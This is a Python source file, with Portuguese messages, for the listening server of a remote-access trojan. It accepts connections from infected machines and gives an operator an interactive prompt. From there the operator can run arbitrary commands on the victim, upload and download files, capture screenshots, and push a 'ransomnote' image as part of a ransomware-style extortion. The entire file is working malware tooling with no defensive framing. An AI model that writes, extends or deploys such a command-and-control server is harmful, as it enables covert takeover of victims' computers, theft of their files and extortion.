import socket
import threading
import struct
import os

HOST = '0.0.0.0'
PORT = 8082

def recv_exact(conn, count):
    data = b''
    while len(data) < count:
        chunk = conn.recv(count - len(data))
        if not chunk:
            raise ConnectionError("Conexão perdida")
        data += chunk
    return data

def recv_message(conn):
    size_data = recv_exact(conn, 4)
    size = struct.unpack('>I', size_data)[0]
    return recv_exact(conn, size)

def send_message(conn, data):
    if isinstance(data, str):
        data = data.encode()
    size = struct.pack('>I', len(data))
    conn.sendall(size + data)

def handle_client(conn, addr):
    print(f"[+] Conexão de {addr[0]}:{addr[1]}")
    try:
        banner = recv_message(conn).decode(errors="ignore")
        print(f"[+] {banner}")

        while True:
            cmd = input(f"[{addr[0]}] Comando> ").strip()
            if not cmd:
                continue

            # ransomnote
            if cmd.startswith("ransomnote "):
                parts = cmd.split(" ", 1)
                if len(parts) != 2:
                    print("Uso correto: ransomnote nome_arquivo_destino")
                    continue

                dest_filename = parts[1].strip()
                local_path = input("Informe o caminho local da imagem: ").strip()

                if not os.path.isfile(local_path):
                    print(f"[-] Arquivo {local_path} não encontrado.")
                    continue

                send_message(conn, cmd)

                with open(local_path, "rb") as f:
                    file_data = f.read()

                send_message(conn, file_data)
                response = recv_message(conn).decode(errors="ignore")
                print(response)
                continue

            # upload
            if cmd.startswith("upload "):
                remote_filename = cmd.split(" ", 1)[1].strip()
                local_path = input("Arquivo local para upload: ").strip()

                if not os.path.isfile(local_path):
                    print(f"[-] {local_path} não encontrado.")
                    continue

                send_message(conn, cmd)  # Envia comando "upload nome_destino"

                with open(local_path, "rb") as f:
                    file_data = f.read()

                send_message(conn, file_data)  # Envia o conteúdo binário do arquivo
                response = recv_message(conn).decode(errors="ignore")
                print(response)
                continue

            # download
            if cmd.startswith("download "):
                send_message(conn, cmd)
                data = recv_message(conn)
                filename = cmd.split(" ", 1)[1]
                with open(filename, "wb") as f:
                    f.write(data)
                print(f"[+] Arquivo salvo como {filename}")
                continue

            # screenshot
            if cmd == "screenshot":
                send_message(conn, cmd)
                data = recv_message(conn)
                filename = f"screenshot_{addr[0].replace('.', '_')}.png"
                with open(filename, "wb") as f:
                    f.write(data)
                print(f"[+] Screenshot salva como {filename}")
                continue

            # comando genérico
            send_message(conn, cmd)
            if cmd == "exit":
                break

            resp = recv_message(conn).decode(errors="ignore")
            print(resp)

    except Exception as e:
        print(f"[-] Erro com {addr[0]}: {e}")
    finally:
        conn.close()
        print(f"[-] Conexão encerrada com {addr[0]}")

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[+] Aguardando conexões na porta {PORT}...")

    try:
        while True:
            conn, addr = server.accept()
            thread = threading.Thread(target=handle_client, args=(conn, addr))
            thread.start()
    except KeyboardInterrupt:
        print("\n[-] Encerrando servidor...")
    finally:
        server.close()

if __name__ == "__main__":
    main()
